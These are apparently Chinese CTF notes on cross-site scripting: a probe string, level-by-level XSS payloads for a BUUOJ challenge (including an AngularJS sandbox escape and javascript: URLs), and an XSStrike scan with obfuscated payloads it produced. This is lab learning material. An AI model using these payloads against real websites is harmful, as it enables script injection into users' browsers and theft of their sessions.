### xss探针

```
xss探针:';`"><aaa bbb=ccc>ddd<aaa/>
```

```
payload(这里由于可以控制标签，优先使用<img><script>):
对于<img src=x onerror=alert(1)>
```

### [第二章 web进阶]XSS闯关


```
LEVEL1: ?username=<script>alert(1)</script>
LEVEL2: ?username=';alert(1);//
LEVEL3: ?username='';alert(1);//
LEVEL4: ?jumpUrl=javascript:alert(1)
LEVEL5: ?autosubmit=1&action=javascript:alert(1)
LEVEL6: ?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```



### xsstrike:

```
python .\xsstrike.py -u http://2e744656-2b6c-45ce-ba24-8b2dacaaca77.node5.buuoj.cn:81/level1?username=1 --crawl -l 3
```

得到的payload：

```
http://2e744656-2b6c-45ce-ba24-8b2dacaaca77.node5.buuoj.cn:81/level1?username=%3CHTmL%0aoNMoUsEOVer%0a=%0a[alert()].find(confirm)//
```


```
http://2e744656-2b6c-45ce-ba24-8b2dacaaca77.node5.buuoj.cn:81/level1?username=%3Chtml%09oNpoINtErEnTer%0a=%0a(prompt)``//
```

